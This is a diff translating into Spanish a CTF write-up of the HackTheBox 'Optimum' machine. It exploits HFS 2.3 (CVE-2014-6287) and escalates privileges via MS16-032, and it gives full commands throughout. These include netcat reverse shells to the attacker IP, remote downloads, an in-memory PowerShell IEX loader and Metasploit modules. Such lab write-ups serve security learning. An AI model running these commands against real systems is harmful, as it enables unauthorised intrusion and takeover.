@@ -1,13 +1,13 @@
-# Optimum (Easy · Windows)
+# Optimum (Easy Windows)
 
 **Author:** Ph4n3s
-**Date:** 2026-10-24
+**Fecha:** 24/10/2026
 **IP:** 10.129.80.29
-**Difficulty:** Easy / Windows
+**Dificultad:** Easy / Windows
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
 ### 1.1 Ping
 
@@ -19,9 +19,9 @@ ping -c 1 10.129.80.29
 64 bytes from 10.129.80.29: icmp_seq=1 ttl=127 time=54.6 ms
 ```
 
-TTL close to 128 → Windows system.
+TTL cercano a 128 → sistema Windows.
 
-### 1.2 Open ports
+### 1.2 Puertos abiertos
 
 ```
 nmap -p- --open -T4 --min-rate 5000 10.129.80.29
@@ -31,9 +31,9 @@ nmap -p- --open -T4 --min-rate 5000 10.129.80.29
 80/tcp open  http
 ```
 
-A single open port, a web service.
+Un único puerto abierto, servicio web.
 
-### 1.3 Technology enumeration
+### 1.3 Enumeración de tecnologías
 
 ```
 nmap -p 80 -sVC -T4 --min-rate 5000 -Pn 10.129.80.29
@@ -46,17 +46,17 @@ nmap -p 80 -sVC -T4 --min-rate 5000 -Pn 10.129.80.29
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-**HFS (HttpFileServer) 2.3** is a lightweight file server by Rejetto with a known history of critical RCE vulnerabilities.
+**HFS (HttpFileServer) 2.3** es un servidor de ficheros ligero de Rejetto con un historial conocido de vulnerabilidades críticas de RCE.
 
-### 1.4 nmap vuln script
+### 1.4 Script vuln de nmap
 
 ```
 nmap -p 80 --script vuln -Pn --min-rate 5000 -T4 10.129.80.29
 ```
 
-Only returns false positives (Slowloris, generic verb tampering). A `curl -I -v http://10.129.80.29` also adds nothing beyond the already-known `Server: HFS 2.3` header.
+Solo devuelve falsos positivos (Slowloris, verb tampering genérico). Un `curl -I -v http://10.129.80.29` tampoco aporta nada más allá de la cabecera `Server: HFS 2.3` ya conocida.
 
-### 1.5 Searching for exploits
+### 1.5 Búsqueda de exploits
 
 ```
 searchsploit HFS 2.3
@@ -66,13 +66,13 @@ searchsploit HFS 2.3
 HFS (HTTP File Server) 2.3.x - Remote Command Execution (3) | windows/remote/49584.py
 ```
 
-This corresponds to **CVE-2014-6287**: HFS insecurely interprets certain strings in the search parameters (`%00` / `search=`), which allows injecting and executing system commands through the web server itself.
+Esto corresponde a **CVE-2014-6287**: HFS interpreta de forma insegura ciertas cadenas en los parámetros de búsqueda (`%00` / `search=`), lo que permite inyectar y ejecutar comandos del sistema a través del propio servidor web.
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-We copy the exploit and adjust the attacker IP, the victim IP and the listening port. Since the exploit lives in `/usr/share/exploitdb/...` (read-only for a normal user), we need `sudo` to edit it in place:
+Copiamos el exploit y ajustamos IP de atacante, IP de la víctima y puerto de escucha. Como el exploit vive en `/usr/share/exploitdb/...` (solo lectura para el usuario normal), hace falta `sudo` para editarlo in situ:
 
 ```bash
 sudo sed -i 's/lhost = "10.10.10.1"/lhost = "10.10.16.120"/' /usr/share/exploitdb/exploits/windows/remote/49584.py
@@ -80,20 +80,20 @@ sudo sed -i 's/lport = 1111/lport = 9001/' /usr/share/exploitdb/exploits/windows
 sudo sed -i 's/rhost = "10.10.10.8"/rhost = "10.129.80.29"/' /usr/share/exploitdb/exploits/windows/remote/49584.py
 ```
 
-![Editing exploit 49584.py: the first attempt without sudo fails due to permissions, the second with sudo works](optimum-01-editar-exploit.png)
+![Edición del exploit 49584.py: el primer intento sin sudo falla por permisos, el segundo con sudo funciona](optimum-01-editar-exploit.png)
 
-With a listener open on the same port configured in the script:
+Con un listener abierto en el mismo puerto configurado en el script:
 
 ```bash
 nc -lvnp 9001
 python3 /usr/share/exploitdb/exploits/windows/remote/49584.py
 ```
 
-The exploit triggers remote execution on the HFS server and we receive a shell as the user `kostas`:
+El exploit dispara la ejecución remota en el servidor HFS y recibimos una shell como el usuario `kostas`:
 
-![Shell received: whoami confirms optimum\kostas](optimum-02-shell-kostas.png)
+![Shell recibida: whoami confirma optimum\kostas](optimum-02-shell-kostas.png)
 
-From there, we navigate to `C:\Users\kostas\Desktop` and read the first flag:
+Desde ahí, navegamos a `C:\Users\kostas\Desktop` y leemos la primera flag:
 
 ```
 USER FLAG -> 241941347303caa38c6c2f102e8078b0
@@ -101,26 +101,26 @@ USER FLAG -> 241941347303caa38c6c2f102e8078b0
 
 ---
 
-## 3. Privilege escalation
+## 3. Escalada de privilegios
 
-The `kostas` user has no access to the `Administrator` desktop. We review privileges and the system version:
+El usuario `kostas` no tiene acceso al escritorio de `Administrator`. Revisamos privilegios y versión del sistema:
 
 ```
 whoami /priv
 systeminfo
 ```
 
-The system is **Windows Server 2012 R2 Standard, Build 9600**. We check which patches are installed:
+El sistema es **Windows Server 2012 R2 Standard, Build 9600**. Comprobamos qué parches tiene instalados:
 
 ```
 systeminfo | findstr /C:"KB"
 ```
 
-It is missing the **KB3014442** hotfix, which fixes a local privilege escalation vulnerability known as **MS16-032 / CVE-2016-0099** (a flaw in the handling of the Secondary Logon Handle).
+Falta el hotfix **KB3014442**, que corrige una vulnerabilidad de escalada de privilegios local conocida como **MS16-032 / CVE-2016-0099** (fallo en el manejo de Secondary Logon Handle).
 
-### 3.1 First attempt (failed)
+### 3.1 Primer intento (fallido)
 
-We try downloading a compiled binary and `nc.exe` directly onto the Windows machine:
+Probamos descargando un binario compilado y `nc.exe` directamente en la máquina Windows:
 
 ```powershell
 wget http://10.10.16.120/nc.exe -OutFile nc.exe
@@ -128,11 +128,11 @@ wget http://10.10.16.120/41020.exe -OutFile 41020.exe
 .\41020.exe "nc.exe -e cmd.exe 10.10.16.120 9002"
 ```
 
-The `41020.exe` file did not get served correctly from our Python server (`404 File not found` in the log), so this path is discarded.
+El archivo `41020.exe` no llegó a servirse correctamente desde nuestro servidor Python (`404 File not found` en el log), así que este camino se descarta.
 
-### 3.2 Second attempt: Invoke-MS16032.ps1
+### 3.2 Segundo intento: Invoke-MS16032.ps1
 
-We look locally for a PowerShell PoC for the same vulnerability:
+Buscamos localmente un PoC en PowerShell para la misma vulnerabilidad:
 
 ```
 find / -name "Invoke-MS16032.ps1" 2>/dev/null
@@ -142,9 +142,9 @@ find / -name "Invoke-MS16032.ps1" 2>/dev/null
 /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1
 ```
 
-![Locating the script inside the PowerShell Empire modules](optimum-03-find-invoke-ms16032.png)
+![Localizamos el script dentro de los módulos de PowerShell Empire](optimum-03-find-invoke-ms16032.png)
 
-We copy it to our working directory, append the specific invocation at the end (run `nc.exe` against our IP) and serve both the script and the `nc.exe` binary with an HTTP server:
+Lo copiamos a nuestro directorio de trabajo, le añadimos al final la invocación concreta (ejecutar `nc.exe` contra nuestra IP) y servimos tanto el script como el binario de `nc.exe` con un servidor HTTP:
 
 ```bash
 cp /usr/share/windows-resources/binaries/nc.exe .
@@ -152,29 +152,29 @@ echo 'Invoke-MS16032 -Command "cmd /c C:\Users\kostas\Desktop\nc.exe -e cmd.exe 
 python3 -m http.server 80
 ```
 
-From `kostas`'s shell, we download and run the script in memory:
+Desde la shell de `kostas`, descargamos y ejecutamos el script en memoria:
 
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.120/Invoke-MS16032.ps1')
 ```
 
-![Preparing the privesc: Invoke-MS16032.ps1 and nc.exe are served; the log on the right shows the target's requests](optimum-04-preparando-privesc.png)
+![Preparando el privesc: se sirve Invoke-MS16032.ps1 y nc.exe; el log de la derecha muestra las peticiones del objetivo](optimum-04-preparando-privesc.png)
 
-With a listener open on the specified port, the exploit abuses a mishandled Secondary Logon *handle* to spawn a process with `NT AUTHORITY\SYSTEM` privileges, which runs `nc.exe` and returns a system shell.
+Con un listener abierto en el puerto indicado, el exploit abusa de un *handle* mal gestionado de Secondary Logon para lanzar un proceso con privilegios de `NT AUTHORITY\SYSTEM`, que ejecuta `nc.exe` y nos devuelve una shell de sistema.
 
-We navigate to `C:\Users\Administrator\Desktop` and read the final flag:
+Navegamos a `C:\Users\Administrator\Desktop` y leemos la flag final:
 
 ```
 ROOT FLAG -> 6764c494c49eaefddae6b398024f3344
 ```
 
-![Optimum machine owned on HackTheBox](optimum-05-pwned.png)
+![Máquina Optimum resuelta en HackTheBox](optimum-05-pwned.png)
 
 ---
 
-## 4. Metasploit alternative
+## 4. Alternativa con Metasploit
 
-The entire process above (especially the escalation) can be automated with two `msfconsole` modules, avoiding the manual back-and-forth of exploits and binaries:
+Todo el proceso anterior (sobre todo la escalada) se puede automatizar con dos módulos de `msfconsole`, evitando el trasiego manual de exploits y binarios:
 
 ```
 use exploit/windows/http/rejetto_hfs_exec
@@ -184,7 +184,7 @@ set RPORT 80
 run
 ```
 
-This gives a meterpreter session. After migrating to a more stable process (`migrate <pid>`) and backgrounding it (`background`):
+Esto da una sesión de meterpreter. Tras migrar a un proceso con más estabilidad (`migrate <pid>`) y dejarla en segundo plano (`background`):
 
 ```
 use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
@@ -193,21 +193,21 @@ set LHOST 10.10.16.120
 run
 ```
 
-The result is the same: a final session as `NT AUTHORITY\SYSTEM`.
+El resultado es el mismo: una sesión final como `NT AUTHORITY\SYSTEM`.
 
 ---
 
-## Quick summary
+## Resumen rápido
 
-**What the machine was:** an HFS 2.3 file server (Rejetto) with a known RCE, on top of a Windows Server 2012 R2 missing the patch for a local privilege escalation vulnerability.
+**Qué era la máquina:** un servidor de ficheros HFS 2.3 (Rejetto) con una RCE conocida, sobre un Windows Server 2012 R2 sin el parche de una vulnerabilidad de escalada de privilegios local.
 
-**Enumeration:** `nmap` → only port 80 → HFS 2.3 version identified → `searchsploit` confirms CVE-2014-6287 (RCE via injection in search parameters).
+**Enumeración:** `nmap` → solo puerto 80 → versión HFS 2.3 identificada → `searchsploit` confirma CVE-2014-6287 (RCE por inyección en parámetros de búsqueda).
 
-**Exploitation:** the public exploit (`49584.py`) is adjusted with our IP/port and run directly against the service → shell as `kostas`.
+**Explotación:** se ajusta el exploit público (`49584.py`) con nuestra IP/puerto y se ejecuta directamente contra el servicio → shell como `kostas`.
 
-**Privilege escalation:** `systeminfo` reveals the missing KB3014442 patch → vulnerable to MS16-032 (CVE-2016-0099) → after a first failed attempt with a precompiled binary, the PowerShell PoC `Invoke-MS16032.ps1` is used (found in the PowerShell Empire modules), loaded in memory via `IEX` → shell as `NT AUTHORITY\SYSTEM`.
+**Escalada de privilegios:** `systeminfo` revela la falta del parche KB3014442 → vulnerable a MS16-032 (CVE-2016-0099) → tras un primer intento fallido con un binario precompilado, se usa el PoC en PowerShell `Invoke-MS16032.ps1` (localizado en los módulos de PowerShell Empire), cargado en memoria vía `IEX` → shell como `NT AUTHORITY\SYSTEM`.
 
-**Key concept learned:** when a compiled exploit fails (due to network issues, antivirus or plain incompatibility), it is worth looking for an alternative implementation of the same CVE in another language or format — here, switching from an `.exe` that never downloaded to a PowerShell script loaded in memory was what unlocked the escalation.
+**Concepto clave aprendido:** cuando un exploit compilado falla (por problemas de red, antivirus o simple incompatibilidad), merece la pena buscar una implementación alternativa de la misma CVE en otro lenguaje o formato — aquí el salto de un `.exe` que no se llegó a descargar a un script de PowerShell cargado en memoria fue lo que desbloqueó la escalada.
 
 ---
 
